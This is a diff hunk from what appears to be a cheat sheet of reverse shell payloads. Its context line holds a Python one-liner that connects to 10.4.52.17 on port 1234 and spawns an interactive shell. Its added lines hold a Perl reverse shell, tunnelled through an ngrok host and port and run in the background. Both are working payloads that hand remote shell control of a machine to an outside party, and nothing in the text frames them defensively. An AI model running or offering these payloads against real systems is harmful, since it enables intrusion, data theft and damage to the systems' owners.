@@ -1,1 +1,6 @@
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.52.17",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+perl reverse shell payload (with ngrok port forwarding)
+--------------------------------------------------------
+perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=18758;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
+exec("/bin/sh -i");};' &
